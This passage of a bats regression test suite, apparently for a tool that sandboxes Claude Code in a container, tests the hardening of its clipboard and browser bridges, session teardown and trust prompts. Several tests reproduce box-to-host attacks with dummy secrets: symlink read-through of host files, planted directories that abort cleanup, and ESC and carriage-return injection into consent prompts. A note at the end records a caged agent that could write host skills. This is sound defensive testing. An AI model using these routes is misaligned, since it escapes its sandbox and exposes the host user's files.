  wait "$tp" 2>/dev/null || true
  assert_equal "$hit" 0
  # Proof the lock really came and went under the check, or the loop is vacuous.
  run test "$held" -gt 0 -a "$free" -gt 0
  assert_success
}

@test "regression v1.5.2: a waiter that sees two releases is not told the accounts directory is unwritable" {
  # A failed make with nothing at the path means either an unwritable directory
  # or a release that landed in between, so one retry comes free. It was spent
  # for good: with several waiters a second release in that window read as an
  # unwritable directory and the command failed with the wrong cause. Here the
  # first make loses to a release, the second loses to another waiter that then
  # releases during the pause, and the third loses to a release again.
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/accounts"
  command mkdir -p "$CLEAT_ACCOUNTS_DIR"
  _T_LOCK="$CLEAT_ACCOUNTS_DIR/.lock"
  _T_MK="$TEST_TEMP/mk"
  mkdir() {
    if [[ "$1" != "$_T_LOCK" ]]; then command mkdir "$@"; return; fi
    printf 'x' >> "$_T_MK"
    case "$(wc -c < "$_T_MK" | tr -d ' ')" in
      1|3) return 1 ;;
      2) command mkdir "$_T_LOCK"
         printf 'host %s pid %s at %s\n' "${HOSTNAME:-unknown}" "$$" "$(date +%s)" > "$_T_LOCK/owner"
         return 1 ;;
      *) command mkdir "$@" ;;
    esac
  }
  _account_lock_pause() { rm -rf "$_T_LOCK"; }
  _ACCOUNT_LOCK_WAIT_S=2
  run _account_lock
  unset -f mkdir
  assert_success
  run cat "$_T_MK"
  assert_output "xxxx"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.0: the kit scout's generated frontmatter wrapped its description as an
# unquoted YAML plain scalar containing colon-space ("all exploration:
# finding"), which is invalid YAML ("mapping values are not allowed here").
# Claude Code silently drops an agent whose frontmatter fails to parse, so
# every kit box shipped with a dead scout: the planner CLAUDE.md kept telling
# the model to dispatch it, and every dispatch errored "Agent type 'scout'
# not found". The worker survived only because its wrapped description
# happens to contain no colon.
@test "regression v1.2.0: kit agent frontmatter stays parseable YAML, no colon-space in unquoted scalars" {
  CLEAT_RUN_DIR="$CLEAT_CONFIG_DIR/run"
  CLEAT_KITS_DIR="$CLEAT_CONFIG_DIR/kits"
  mkdir -p "$TEST_TEMP/project" && cd "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  _box_kit_write "$cname" "plan-big-execute-small"
  _generate_kit_overlay "$cname"
  [ -f "$CLEAT_RUN_DIR/$cname/kit/agents/kit-scout.md" ]
  [ -f "$CLEAT_RUN_DIR/$cname/kit/agents/kit-worker.md" ]
  # Minimal plain-scalar YAML check over every generated agent frontmatter:
  # inside the --- block, strip the "key: " prefix, skip quoted values, then
  # reject any remaining colon-space or trailing colon on any line (either
  # one flips a plain scalar into a mapping and kills the parse).
  local f
  for f in "$CLEAT_RUN_DIR/$cname/kit/agents"/kit-*.md; do
    run awk '
      NR==1 && $0=="---" { infm=1; next }
      infm && $0=="---" { exit bad }
      infm {
        line=$0
        if (line ~ /^[A-Za-z_-]+:([ \t]|$)/) sub(/^[A-Za-z_-]+:[ \t]*/, "", line)
        if (line ~ /^["'\'']/) next
        if (line ~ /: / || line ~ /:[ \t]*$/) { print FILENAME ": bad plain scalar: " $0; bad=1 }
      }
      END { exit bad }
    ' "$f"
    assert_success
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.0: _read_keypress mapped every unrecognized escape sequence to the same
# case as a bare Escape key: ESC. Arrow-key variants it didn't decode (only
# UP/DOWN were handled) and every other escape sequence (PgUp \e[5~, PgDn,
# Home, End, F-keys) all fell through to ESC. Both the kit picker and the
# caps picker's event loops treat ESC as "cancel with nothing written", so a
# stray right-arrow while cycling a model, or PgUp/PgDn muscle memory, closed
# the picker outright. Fix: decode \e[C/\e[D as RIGHT/LEFT, and return OTHER
# (not ESC) for any other escape sequence; only a BARE escape (nothing
# follows the \e) is still ESC.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.0: stray arrows and unknown escape sequences never cancel the pickers" {
  run _read_keypress <<< $'\033[C'
  assert_success
  assert_output "RIGHT"

  run _read_keypress <<< $'\033[D'
  assert_success
  assert_output "LEFT"

  run _read_keypress <<< $'\033[A'
  assert_success
  assert_output "UP"

  run _read_keypress <<< $'\033[5~'
  assert_success
  assert_output "OTHER"
}

# v0.1.0 baked in-box guidance (docker/CLAUDE.md: the clipboard-bridge rules)
# at /home/coder/.claude/CLAUDE.md in the image, and v0.1.0 also mounted the
# host's ~/.claude directory over that same path, which shadows everything
# beneath it. So no box ever saw the rules: Claude inside the box did not
# know pbcopy/xclip reach the host clipboard, and wasted turns running the
# forbidden read-back checks (xclip -o) the notes exist to prevent. The fix
# composes the notes into the generated overlay CLAUDE.md (the mask that owns
# the path in every v1.2.0+ box), user content first, notes under a marked
# header, kit section after.
@test "regression v0.1.0: clipboard-bridge box notes actually reach the box CLAUDE.md" {
  CLEAT_RUN_DIR="$CLEAT_CONFIG_DIR/run"
  CLEAT_KITS_DIR="$CLEAT_CONFIG_DIR/kits"
  mkdir -p "$TEST_TEMP/project" && cd "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mkdir -p "$HOME/.claude"
  echo "MY GLOBAL RULES" > "$HOME/.claude/CLAUDE.md"
  _generate_kit_overlay "$cname"
  run head -1 "$CLEAT_RUN_DIR/$cname/kit/CLAUDE.md"
  assert_output "MY GLOBAL RULES"
  run cat "$CLEAT_RUN_DIR/$cname/kit/CLAUDE.md"
  assert_output --partial "clipboard bridge forwarding"
  assert_output --partial "Do NOT try to verify clipboard contents after copying"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: The clipboard payload file ($CLEAT_RUN_DIR/<cname>/clip/clipboard)
# was never removed anywhere: _cleanup_session only sweeps dot-prefixed
# markers, and mkdir -p at attach never purges. Every attach spawns a fresh
# watcher whose polling fallback started from last_ts="", so its very first
# tick saw the leftover file as "changed" and piped a PREVIOUS session's copy
# into the host clipboard right after start. Fix is layered like the browser
# bridge's v0.6.1 fix: an age-gated sweep of the leftover at watcher startup,
# plus consume-on-read (atomic mv claim) in _do_copy so a delivered payload
# no longer exists to replay. This test seeds an old payload BEFORE the
# watcher spawns: it must be swept, not delivered, in every watch mode.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: clipboard watcher never redelivers a previous session's payload" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  echo "stale-secret" > "$clip_dir/clipboard"
  touch -t 202001010000 "$clip_dir/clipboard"
  echo "stranded" > "$clip_dir/.claim.4242.7"
  touch -t 202001010000 "$clip_dir/.claim.4242.7"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  [ ! -f "$TEST_TEMP/copied" ] || { echo "REGRESSION: stale payload was redelivered to the host clipboard"; return 1; }
  [ ! -f "$clip_dir/clipboard" ] || { echo "REGRESSION: stale payload survived watcher startup"; return 1; }
  [ ! -f "$clip_dir/.claim.4242.7" ] || { echo "REGRESSION: stranded claim survived watcher startup"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5 (hardening): a backward host clock step (NTP correction, VM clock
# catch-up after macOS sleep) makes a leftover payload's mtime sit AHEAD of
# now, so "age > 5" never fires and the polling watcher would redeliver it,
# reproducing the stale-redelivery bug through the side door. A negative age
# must sweep too: never replaying old bytes is the fail-safe direction.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: clipboard sweep treats a future-dated leftover as stale" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  echo "stale-from-the-future" > "$clip_dir/clipboard"
  touch -t 203001010000 "$clip_dir/clipboard"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  [ ! -f "$TEST_TEMP/copied" ] || { echo "REGRESSION: future-dated leftover was redelivered"; return 1; }
  [ ! -f "$clip_dir/clipboard" ] || { echo "REGRESSION: future-dated leftover survived watcher startup"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# Clipboard bridge symlink read-through. The clip dir is a READ-WRITE bind
# mount into the box, so the box can put a symlink where a payload belongs.
# `mv` moved the link without following it, the `<` redirect that delivered it
# DID follow it, and both presence gates used [ -f ], which dereferences. So a
# box could name any file the host user can read and have the host's own
# watcher pipe it into the host clipboard. Reproduced end to end on 2026-08-11.
#
# Three properties, one per test: a link is never read through, a link planted
# before startup is swept unaged, and the claim is renamed OUT of the shared
# directory so the box cannot swap it between the rename and the read.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: a symlinked clipboard payload is never read through to the host" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  echo "HOST-PRIVATE-KEY" > "$TEST_TEMP/secret"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 0.3
  # Exactly what the box can do today: plant the link, then rename it into
  # place the way the shim delivers a real payload (which is what fires the
  # watcher's moved_to).
  ln -s "$TEST_TEMP/secret" "$TEST_TEMP/evil"
  mv "$TEST_TEMP/evil" "$clip_dir/clipboard"
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  if [ -f "$TEST_TEMP/copied" ]; then
    run cat "$TEST_TEMP/copied"
    refute_output --partial "HOST-PRIVATE-KEY"
  fi
  [ ! -e "$clip_dir/clipboard" ] && [ ! -L "$clip_dir/clipboard" ] || {
    echo "REGRESSION: the planted symlink survived instead of being dropped"; return 1; }
  run cat "$TEST_TEMP/secret"
  assert_output "HOST-PRIVATE-KEY"
}

@test "regression: a symlink planted before startup is swept, never delivered" {
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir" "$TEST_TEMP/bin"
  echo "HOST-PRIVATE-KEY" > "$TEST_TEMP/secret"
  # No age gate applies to a link. The shim only ever renames a regular file
  # into place, so a link is hostile at any age, including zero seconds old.
  ln -s "$TEST_TEMP/secret" "$clip_dir/clipboard"

  # Force the EVENT-DRIVEN branch, which is the only one where this matters and
  # the one real hosts take. A link planted BEFORE the watcher starts never
  # fires moved_to, so _do_copy never runs and the startup sweep is the only
  # thing that can remove it. Without this stub the polling fallback picks the
  # link up on its first tick and _do_copy's own guard drops it, so the test
  # passes whatever the sweep does. That is how this test first shipped, and
  # the mutation harness caught it.
  printf '#!/usr/bin/env bash\nsleep 30\nexit 1\n' > "$TEST_TEMP/bin/inotifywait"
  chmod +x "$TEST_TEMP/bin/inotifywait"
  PATH="$TEST_TEMP/bin:$PATH"

  _clipboard_watcher "$clip_dir" "cat >> '$TEST_TEMP/copied'" >/dev/null 2>&1 &
  local pid=$!
  sleep 1
  stop_watcher "$pid" "$clip_dir"

  [ ! -L "$clip_dir/clipboard" ] || {
    echo "REGRESSION: startup sweep left a planted symlink in place"; return 1; }
  [ ! -f "$TEST_TEMP/copied" ] || {
    echo "REGRESSION: the planted symlink was delivered to the host clipboard"; return 1; }
}

@test "regression: a dead session's watcher marker never latches .host-ready on" {
  # .watcher.<pid> markers carry the HOST pid of a clipboard watcher. The
  # cleanup tested mere EXISTENCE, so a marker left by a crashed session held
  # .host-ready on forever. docker/clip takes the file-bridge path whenever
  # .host-ready exists, so a session with no watcher running wrote its payload
  # to a bridge nobody was reading: the copy was swept as a stale leftover and
  # the OSC 52 fallback that would have worked was never tried. Found live with
  # two markers from two days earlier sitting next to the current one.
  local dir="$TEST_TEMP/clip"
  mkdir -p "$dir"
  # Since v1.5.4 the markers live in clipwatch/, the host-only sibling of the
  # clip dir. The sweep still takes the clip dir.
  local wdir="$TEST_TEMP/clipwatch"
  mkdir -p "$wdir"

  # No background jobs: a child outliving the test makes bats miscount tests.
  # Live pid = this test's own shell. Dead pid = a subshell that has already
  # exited by the time the substitution returns, which beats guessing a number
  # the OS might be using.
  local live=$$
  local dead
  dead="$(sh -c 'echo $$')"

  touch "$wdir/.watcher.$live" "$wdir/.watcher.$dead" "$wdir/.watcher.notanumber"
  _sweep_dead_watcher_markers "$dir"

  [ -e "$wdir/.watcher.$live" ] || {
    echo "REGRESSION: swept a LIVE watcher's marker, which would drop .host-ready under a working bridge"; return 1; }
  [ ! -e "$wdir/.watcher.$dead" ] || {
    echo "REGRESSION: a dead session's marker survived and will latch .host-ready on"; return 1; }
  [ ! -e "$wdir/.watcher.notanumber" ] || {
    echo "REGRESSION: a malformed marker survived"; return 1; }

  # Last real watcher gone: nothing may remain to hold the latch on.
  rm -f "$wdir/.watcher.$live"
  _sweep_dead_watcher_markers "$dir"
  run bash -c "ls '$wdir'/.watcher.* 2>/dev/null; true"
  assert_output ""
}

# v1.5.4: exec_claude under the binary's own strict mode. test/setup.bash strips
# line 2 when it sources the CLI, and errexit is the defect these tests guard.
# `run` puts it in a subshell, so the bats process itself stays lenient. -u is
# left out on purpose: the smoke test covers it on the real binary.
_strict_exec_claude() { set -eo pipefail; exec_claude "$@"; }

@test "regression v1.5.4: a directory the box plants in the clip dir cannot end the session before its harvest and reports" {
  # _cleanup_session ran plain `rm -f` on names the box can shape: the
  # .clipboard.* glob, both .claim.<pid>.* globs and .host-ready. The clip dir
  # is the box's read-write /tmp/cleat-clip, and rm -f on a directory exits 1
  # on GNU and BSD. Under the binary's set -e that ended the CLI at the first
  # one, and the EXIT trap then died on the same line. Skipped: the terminal
  # restore, the login harvest, "Session ended" and every session-end report,
  # including the one that says ~/.claude/.config.json appeared. The
  # clipclaim/ claim is outside the mount, but a watcher killed between its mv
  # of a planted directory and the rm -rf leaves exactly this behind.
  _host_open_cmd() { echo ""; }
  _wait_for_coder_remap() { true; }
  _account_sync_out() { echo "HARVEST_RAN"; }
  local run_dir="$CLEAT_RUN_DIR/test-ctr"
  docker() {
    case " $* " in
      *" exec "*" runuser "*)
        mkdir -p "$run_dir/clip/.clipboard.planted" "$run_dir/clip/.claim.$$.planted" \
                 "$run_dir/clipclaim/.claim.$$.planted"
        rm -f "$run_dir/clip/.host-ready"; mkdir "$run_dir/clip/.host-ready"
        printf '{}\n' > "$HOME/.claude/.config.json" ;;
    esac
    command docker "$@"
  }
  run _strict_exec_claude test-ctr --dangerously-skip-permissions
  assert_success
  assert_output --partial "HARVEST_RAN"
  assert_output --partial "Session ended"
  assert_output --partial "appeared during this session"
  # No rm diagnostic reaches the terminal. On macOS it carried the box's bytes.
  # This is also what catches a single removal losing its guard, because the
  # errexit wrapper absorbs the abort itself.
  refute_output --partial "rm: "
}

@test "regression v1.5.4: a teardown step that fails still restores the terminal, harvests the login and reports the session" {
  # Defence in depth for the test above: the teardown is best-effort, so no
  # step inside it may decide whether the restore, the harvest and the reports
  # run. Covers both ways the teardown is reached, the final call and the
  # TERM/HUP trap (a closed terminal window). errexit stays live inside a trap
  # action, so a guard at the final call site alone would miss the second.
  _host_open_cmd() { echo ""; }
  _wait_for_coder_remap() { true; }
  _account_sync_out() { echo "HARVEST_RAN"; }
  _restore_terminal() { echo "RESTORE_TERMINAL_CALLED"; }
  # The stand-in for any teardown step that fails.
  _browser_teardown_bridge() { return 1; }
  run _strict_exec_claude test-ctr --dangerously-skip-permissions
  assert_success
  assert_output --partial "RESTORE_TERMINAL_CALLED"
  assert_output --partial "HARVEST_RAN"
  assert_output --partial "Session ended"

  # The same step failing inside the TERM trap. $PPID of the child is the shell
  # running exec_claude, so the signal lands on it mid-exec, as a HUP would.
  # bash runs the trap once the foreground child has exited.
  docker() {
    case " $* " in
      *" exec "*" runuser "*) sh -c 'kill -TERM $PPID' ;;
    esac
    command docker "$@"
  }
  run _strict_exec_claude test-ctr --dangerously-skip-permissions
  assert_success
  assert_output --partial "HARVEST_RAN"
  assert_output --partial "Session ended"
}

@test "regression: a symlinked browser-bridge file is never read through" {
  # Same bug, same shared dir, different consumer: _browser_claim_url gated on
  # [ -f ] (dereferences), moved the link with mv (does not), then `cat`ed the
  # claim (does). So a box could name any host file and have the host read it.
  echo "HOST-PRIVATE-KEY" > "$TEST_TEMP/secret"
  ln -s "$TEST_TEMP/secret" "$TEST_TEMP/.browser-open"

  run _browser_claim_url "$TEST_TEMP/.browser-open"
  # Nothing claimed, and above all nothing from the target on stdout: that
  # string is what would have been handed to the host's browser opener.
  assert_failure
  refute_output --partial "HOST-PRIVATE-KEY"
  [ ! -L "$TEST_TEMP/.browser-open" ] || {
    echo "REGRESSION: the planted symlink survived the claim"; return 1; }
  run cat "$TEST_TEMP/secret"
  assert_output "HOST-PRIVATE-KEY"
}

@test "regression: a real browser-bridge URL still claims after the symlink guard" {
  # The guard must not cost the feature: a regular file still claims exactly
  # once and is consumed, which is the property the bridge exists for.
  printf '%s\n' "https://example.com/real" > "$TEST_TEMP/.browser-open"
  run _browser_claim_url "$TEST_TEMP/.browser-open"
  assert_success
  assert_output "https://example.com/real"
  [ ! -e "$TEST_TEMP/.browser-open" ] || {
    echo "REGRESSION: the bridge file was not consumed"; return 1; }
}

@test "regression: the browser claim honours a claim dir outside the mount" {
  # The watcher passes a directory the box cannot see, so the claim cannot be
  # swapped between the rename and the cat. Without the second argument the old
  # behaviour (claim beside the bridge file) is preserved for direct callers.
  #
  # Discriminating on an UNWRITABLE claim dir, because the claim file exists
  # only between the mv and the rm and cannot be observed directly. Honouring
  # the argument means the mv targets a dir that rejects it, so nothing is
  # claimed. Ignoring it means claiming beside the bridge file, which succeeds.
  # Asserting "no litter in outside/" instead was worthless: it is trivially
  # true when the directory is never touched, so it passed under the mutation.
  [ "$(id -u)" -ne 0 ] || skip "root ignores directory permissions"
  mkdir -p "$TEST_TEMP/outside"
  printf '%s\n' "https://example.com/x" > "$TEST_TEMP/.browser-open"
  chmod a-w "$TEST_TEMP/outside"

  run _browser_claim_url "$TEST_TEMP/.browser-open" "$TEST_TEMP/outside"
  chmod u+w "$TEST_TEMP/outside"

  assert_failure
  [ -f "$TEST_TEMP/.browser-open" ] || {
    echo "REGRESSION: claim_dir ignored, the URL was claimed from the wrong directory"; return 1; }
}

@test "regression: the clipboard claim is renamed out of the box-visible dir" {
  # The claim used to be created inside \$clip_dir, which the box has rw. A box
  # watching that directory could swap the claim for a symlink in the window
  # between the rename and the read. Renaming into a host-only sibling closes
  # the window instead of racing it.
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"

  _clipboard_watcher "$clip_dir" \
    "ls '$clip_dir'/.claim.* >> '$TEST_TEMP/in-mount' 2>/dev/null; ls '$TEST_TEMP'/clipclaim/.claim.* >> '$TEST_TEMP/out-of-mount' 2>/dev/null; cat > '$TEST_TEMP/copied'" \
    >/dev/null 2>&1 &
  local pid=$!
  sleep 0.3
  echo "payload" > "$TEST_TEMP/payload"
  mv "$TEST_TEMP/payload" "$clip_dir/clipboard"
  sleep 2
  stop_watcher "$pid" "$clip_dir"

  run cat "$TEST_TEMP/copied"
  assert_output "payload"
  [ -s "$TEST_TEMP/out-of-mount" ] || {
    echo "REGRESSION: no claim existed outside the shared dir at delivery time"; return 1; }
  [ ! -s "$TEST_TEMP/in-mount" ] || {
    echo "REGRESSION: the claim is still created inside the bind-mounted dir"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: on hosts with inotify-tools (or fswatch), _cleanup_session's plain
# `kill` on the clipboard watcher never reached the blocking inotifywait
# child: bash defers a subprocess's own TERM trap while it sits blocked in a
# foreground command, so the watcher (and inotifywait under it) survived
# cleanup as an orphan. Fix: cleanup also kills the watcher's blocking child
# (pkill -P) before waiting, which reaps it for real.
#
# NOTE on how this is verified: exec_claude disowns the watcher PID right
# after spawning it, and bash's `wait` on an already-disowned PID returns
# immediately whether or not the process has actually exited (confirmed by
# hand: it returns in the same tick, before or after the fix). So this test
# does NOT assert on `_cleanup_session` returning quickly, since it always
# does. The mutation-sensitive signal, confirmed empirically both ways, is
# whether inotifywait is still alive afterward: with the fix it is killed
# outright; without it, it (and the watcher shell wrapping it) are orphaned
# and linger. That leftover process is the real-world symptom (it keeps
# holding the run dir/terminal open), so this is what the test checks.
#
# This test only bites where inotifywait exists (the Linux CI leg installs
# it); elsewhere the polling fallback never had the leak and the test skips.
#
# It calls the REAL exec_claude (production code, not a copy) in a helper
# process, which defines and runs the REAL _cleanup_session. A slow-motion
# docker stub delays only the final `docker exec -it ...` launch call, giving
# the clipboard watcher exec_claude spawns time to actually enter its
# blocking inotifywait read before cleanup runs, so this reproduces the real
# race instead of a same-tick race that would pass either way.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: session cleanup reaps a watcher blocked in inotifywait" {
  command -v inotifywait >/dev/null 2>&1 || skip "inotifywait not installed"
  local cname="cleanup-hang-ctr"
  # The REAL clip dir exec_claude will compute for this cname: CLEAT_RUN_DIR
  # resolves from HOME (isolated to $TEST_TEMP/home by _common_setup), so this
  # must match _CLIP_DIR="$CLEAT_RUN_DIR/${cname}/clip", not a throwaway dir,
  # or the straggler check below silently watches the wrong path.
  local clip_dir="$HOME/.config/cleat/run/${cname}/clip"

  mkdir -p "$TEST_TEMP/shim"
  cat > "$TEST_TEMP/shim/docker" <<EOF
#!/usr/bin/env bash
if [ "\$1" = "exec" ]; then
  case " \$* " in
    *" -it "*) sleep 1 ;;
  esac
fi
exec "$MOCK_BIN/docker" "\$@"
EOF
  chmod +x "$TEST_TEMP/shim/docker"

  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  # Only _host_clip_cmd/_host_open_cmd are stubbed, to spawn just the clipboard
  # watcher (with a harmless "true" clip command) and skip the browser
  # watcher/hook bridge, which are out of scope here.
  cat > "$TEST_TEMP/cleanup_spawner.sh" <<EOF
export PATH="$TEST_TEMP/shim:\$PATH"
source "$TEST_TEMP/cli_stripped"
_host_clip_cmd() { echo "true"; }
_host_open_cmd() { echo ""; }
exec_claude "$cname" --dangerously-skip-permissions >/dev/null 2>&1
EOF

  # Bounded regardless: _cleanup_session's wait on this (disowned) watcher
  # PID never actually blocks, so the helper always returns quickly. The
  # timeout below is just a safety net against an unrelated wedge.
  _portable_timeout 15 bash "$TEST_TEMP/cleanup_spawner.sh"

  # Give a straggler inotifywait a brief moment to actually be reaped (or
  # not) before checking; the fix kills it synchronously inside cleanup, so
  # this is generous, not load-bearing.
  sleep 0.3

  if pgrep -f "inotifywait.*$clip_dir" >/dev/null 2>&1; then
    echo "REGRESSION: session cleanup left the clipboard watcher's inotifywait running" >&2
    pkill -9 -f "inotifywait.*$clip_dir" 2>/dev/null || true
    return 1
  fi
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: repo-controlled text (cap names, .cleat lines) is rendered via
# echo -e (see _sanitize_repo_str), so a cap name carrying a raw ESC byte or a
# literal backslash-escape sequence is a terminal-injection vector once it
# reaches _trust_prompt. Guard: a raw ESC byte is stripped before it ever
# reaches echo -e, and a literal `\033`-style sequence stays literal text
# (the backslash is doubled first, so echo -e prints it verbatim instead of
# decoding it into a control byte).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: trust prompt neutralizes control bytes in repo cap names" {
  mkdir -p "$TEST_TEMP/proj"
  local esc
  esc="$(printf '\x1b')"
  {
    echo "[caps]"
    printf '%s\n' "cap${esc}BADESC"
    printf '%s\n' 'cap\033text'
  } > "$TEST_TEMP/proj/.cleat"

  local -a caps=()
  local c
  while IFS= read -r c; do [[ -n "$c" ]] && caps+=("$c"); done < <(_read_caps_from_file "$TEST_TEMP/proj/.cleat")

  run _trust_prompt "$TEST_TEMP/proj" "${caps[@]}" <<< "n"
  # The rendered prompt legitimately contains OTHER raw ESC bytes (the CLI's
  # own BOLD/DIM/RESET color codes), so a blanket refute of any ESC byte
  # would false-fail; check the specific injected sequence instead.
  assert_output --partial "BADESC"
  refute_output --partial "${esc}BADESC"
  assert_output --partial "033"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: the trust file's 3-column row (path, box, caps hash) predates
# [setup]'s 4-column extension (see _trust_record) and every legacy row, and
# every plain caps-only approval, must keep that exact shape. A 3-arg
# _trust_record call must never grow a 4th column.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: caps-only trust rows keep the exact 3-column format" {
  _trust_record "$TEST_TEMP/proj" "capshash123" "main"
  local row expected
  row="$(awk -F'\t' -v p="$TEST_TEMP/proj" '$1==p' "$CLEAT_TRUST_FILE")"
  expected="$(printf '%s\tmain\tcapshash123' "$TEST_TEMP/proj")"
  [[ "$row" == "$expected" ]] || { echo "got: $row"; return 1; }
  local tabs
  tabs="$(printf '%s' "$row" | tr -cd '\t' | wc -c | tr -d ' ')"
  [[ "$tabs" == "2" ]] || { echo "tab count: $tabs (row: $row)"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.2.5: the [setup] consent preview renders repo-controlled payload lines
# through echo -e (see _setup_trust_prompt / _sanitize_repo_str), and a lone
# carriage return (0x0d) rewinds the cursor to column 0. A payload line
# carrying a raw CR could overwrite what the user already read on that
# terminal row with different text, hiding what actually runs behind what
# looks like the approved preview. Guard: CR is in the stripped control-byte
# set, so it never reaches echo -e in the first place.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.2.5: [setup] consent preview neutralizes a carriage return" {
  local cr payload
  cr="$(printf '\r')"
  payload="$(printf 'echo REAL%secho FAKE' "$cr")"
  run _setup_trust_prompt "$TEST_TEMP/proj" "$payload" 1 <<< "n"
  assert_output --partial "echo REAL"
  assert_output --partial "echo FAKE"
  # No other rendered text in this prompt legitimately carries a raw CR (the
  # CLI's own color codes are ESC-based, never CR), so a blanket refute is
  # safe here, unlike the ESC checks elsewhere which must stay scoped.
  refute_output --partial "$cr"
}

# ─────────────────────────────────────────────────────────────────────────────
# .cleat editor (config resources): _write_caps_to_file rewrites a project
# .cleat in place, preserving every section it does not own. Its preserve loop
# read `while IFS= read -r line`, which drops the FINAL line of a file that
# ends WITHOUT a trailing newline (read returns non-zero at EOF and the last
# line is lost). [setup] is exactly the section users hand-edit, and a hand
# written .cleat commonly ends `script build.sh` with no final newline, so a
# later caps write (e.g. the new generate-project flow, or cleat config
# --project --enable) silently corrupted the last [setup] line. The `||
# [[ -n "$line" ]]` guard keeps it, matching _read_section_from_file and the
# resources/kits writers.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: caps writer keeps a no-trailing-newline final [setup] line" {
  printf '[caps]\nssh\n[setup]\nscript build.sh' > "$TEST_TEMP/cleat"   # NO trailing newline
  _write_caps_to_file "$TEST_TEMP/cleat" git env
  run cat "$TEST_TEMP/cleat"
  assert_output --partial "script build.sh"
  assert_output --partial "[setup]"
  assert_output --partial "git"
  assert_output --partial "env"
}

# ─────────────────────────────────────────────────────────────────────────────
# Every host-side watcher (clipboard, browser, hook bridge) is backgrounded
# with its stdout+stderr redirected to a per-box watcher log, NOT the
# interactive terminal. Under a heavy multi-agent load the host hits its
# process cap, and a backgrounded watcher that inherits the terminal's fd 2
# prints bash's own "fork: Resource temporarily unavailable" straight into the
# Claude Code TUI, corrupting it. Guard: a watcher that writes to its stderr
# lands in the log (proving the redirect targets a debuggable file, not the
# terminal and not /dev/null), and the caller's fd 2 stays clean.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression: watchers redirect fork-error stderr to a log, not the terminal" {
  local cname="watcher-fd2-ctr"
  # The real clip dir exec_claude computes for this cname (isolated HOME).
  local clip_dir="$HOME/.config/cleat/run/${cname}/clip"
  mkdir -p "$clip_dir"
  # A leftover clipboard payload makes the watcher's startup call _path_mtime,
  # the synchronous stderr-emitting seam overridden below.
  : > "$clip_dir/clipboard"

  # Docker shim: sleep on the interactive session exec so the backgrounded
  # watcher has a window to run its startup and write to its stderr before
  # cleanup kills it (same technique as the cleanup-reap regression above).
  mkdir -p "$TEST_TEMP/shim"
  cat > "$TEST_TEMP/shim/docker" <<EOF
#!/usr/bin/env bash
if [ "\$1" = "exec" ]; then
  case " \$* " in
    *" -it "*) sleep 1 ;;
  esac
fi
exec "$MOCK_BIN/docker" "\$@"
EOF
  chmod +x "$TEST_TEMP/shim/docker"

  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  cat > "$TEST_TEMP/watcher_spawner.sh" <<EOF
export PATH="$TEST_TEMP/shim:\$PATH"
source "$TEST_TEMP/cli_stripped"
# Spawn only the clipboard watcher (browser watcher + hook bridge skipped).
_host_clip_cmd() { echo "true"; }
_host_open_cmd() { echo ""; }
# Force a synchronous write to the watcher's OWN stderr during its startup.
# Path-guarded to the clipboard leftover sweep so no parent code path trips it.
_path_mtime() {
  case "\$1" in
    */clipboard) echo "WATCHER_FD2_SENTINEL" >&2 ;;
  esac
  echo 0
}
# Capture exec_claude's fd 2 (the caller the watcher must not leak into).
exec_claude "$cname" --dangerously-skip-permissions >/dev/null 2>"$TEST_TEMP/caller-stderr"
EOF

  _portable_timeout 15 bash "$TEST_TEMP/watcher_spawner.sh" || true

  # The watcher wrote its stderr to the per-box log: proves it ran AND that the
  # redirect targets a debuggable file, not the terminal and not /dev/null.
  # Since v1.5.4 the log is host-only, beside the clip dir.
  run grep -q "WATCHER_FD2_SENTINEL" "$HOME/.config/cleat/run/${cname}/logs/watcher.log"
  assert_success
  # ...and it did NOT leak into the caller's fd 2 (the terminal in production).
  run grep -q "WATCHER_FD2_SENTINEL" "$TEST_TEMP/caller-stderr"
  assert_failure
}

@test "regression: a caged agent cannot write the host ~/.claude/skills" {
  # Live probe on the maintainer's machine, 2026-07-25: inside a box,
  # `touch ~/.claude/commands/.probe` and `touch ~/.claude/agents/.probe` both
  # returned "Read-only file system" while `touch ~/.claude/skills/.probe`
  # SUCCEEDED. ~/.claude is bind-mounted read-write and only three surfaces
  # were masked, so the caged agent could plant a skill in the HOST's
